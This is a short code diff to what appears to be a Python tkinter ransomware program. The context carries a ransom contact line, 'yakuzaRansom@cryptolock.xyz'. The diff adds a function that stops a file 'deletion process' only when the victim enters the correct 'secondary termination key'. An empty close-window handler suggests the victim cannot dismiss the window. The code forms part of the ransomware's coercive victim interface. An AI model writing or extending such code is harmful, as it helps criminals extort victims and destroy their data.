@@ -736,6 +736,18 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
             if hasattr(self, 'deletion_dialog') and self.deletion_dialog.winfo_exists():
                 self.deletion_dialog.destroy()
 
+    # Function to check the secondary termination key
+    def check_secondary_termination(self):
+        # Give secondary key from user
+        response = simpledialog.askstring("Stop Deletion", "Enter the secondary termination key:", parent=self)
+
+        # if secondary key is correct then stop the deletion process
+        if response == SECONDARY_TERMINATION_KEY:
+            self.stop_deletion_process()
+        else:
+            messagebox.showerror("Error", "Incorrect secondary termination key.")
+
+
 
     def on_close_window(self):
         pass
